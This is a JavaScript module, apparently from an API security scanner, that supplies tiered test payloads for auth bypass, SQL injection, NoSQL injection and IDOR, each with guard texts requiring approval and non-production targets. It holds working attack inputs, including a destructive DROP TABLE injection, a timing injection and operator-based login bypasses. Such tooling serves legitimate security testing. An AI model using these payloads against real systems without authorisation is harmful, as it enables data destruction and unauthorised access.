const FAMILY_PAYLOAD_PACKS = {
  'auth-bypass': {
    safe: [
      { location: 'header', key: 'Authorization', value: 'Bearer undefined' },
      { location: 'header', key: 'X-Forwarded-For', value: '127.0.0.1' }
    ],
    controlled_mutation: [
      { location: 'body', key: 'otp', value: '000000' },
      { location: 'body', key: 'verificationCode', value: '111111' }
    ],
    high_risk: [
      { location: 'body', key: 'password', value: 'P@ssw0rd!temp' }
    ],
    execution_guards: [
      'Always run safe probes first and compare unauthorized responses.',
      'Require explicit confirmation before OTP, reset, or credential-changing flows.',
      'Block high-risk payloads when target host is not localhost or staging.'
    ]
  },
  'sql-injection': {
    safe: [
      { location: 'query', key: 'q', value: "' OR 1=1 --" },
      { location: 'query', key: 'filter', value: "' AND 1=2 --" }
    ],
    controlled_mutation: [
      { location: 'query', key: 'id', value: "' AND SLEEP(5) --" }
    ],
    high_risk: [
      { location: 'query', key: 'id', value: "'; DROP TABLE users; --" }
    ],
    execution_guards: [
      'Do not execute destructive payloads against non-disposable environments.',
      'Use timing payloads only after safe error-based probes.',
      'Require user approval before controlled-mutation or high-risk payload tiers.'
    ]
  },
  'nosql-injection': {
    safe: [
      { location: 'body', key: 'username', value: '{"$gt":""}' },
      { location: 'body', key: 'password', value: '{"$gt":""}' }
    ],
    controlled_mutation: [
      { location: 'body', key: '$where', value: 'this.role=="admin"' }
    ],
    high_risk: [
      { location: 'body', key: '$function', value: 'return true;' }
    ],
    execution_guards: [
      'Prefer schema-safe malformed JSON probes before operator payloads.',
      'Require approval before adding executable operators or script-like keys.'
    ]
  },
  'bola-idor': {
    safe: [
      { location: 'query', key: 'id', value: '0' },
      { location: 'query', key: 'id', value: '99999' }
    ],
    controlled_mutation: [
      { location: 'path', key: 'id', value: '-1' }
    ],
    high_risk: [
      { location: 'query', key: 'id', value: '1&role=admin' }
    ],
    execution_guards: [
      'Use read-only methods for identifier manipulation first.',
      'Block DELETE/PUT/PATCH IDOR probes unless user confirms mutation.'
    ]
  }
};

const DEFAULT_PACK = {
  safe: [
    { location: 'query', key: 'id', value: '0' }
  ],
  controlled_mutation: [],
  high_risk: [],
  execution_guards: [
    'Default to non-destructive probes first.',
    'Require explicit confirmation before mutating methods.'
  ]
};

function clonePack(pack) {
  return {
    safe: Array.isArray(pack.safe) ? pack.safe.slice(0, 8) : [],
    controlled_mutation: Array.isArray(pack.controlled_mutation) ? pack.controlled_mutation.slice(0, 6) : [],
    high_risk: Array.isArray(pack.high_risk) ? pack.high_risk.slice(0, 4) : [],
    execution_guards: Array.isArray(pack.execution_guards) ? pack.execution_guards.slice(0, 8) : []
  };
}

function resolvePayloadPackForFamily(familyId) {
  const key = typeof familyId === 'string' ? familyId.trim() : '';
  return clonePack(FAMILY_PAYLOAD_PACKS[key] || DEFAULT_PACK);
}

module.exports = {
  resolvePayloadPackForFamily
};
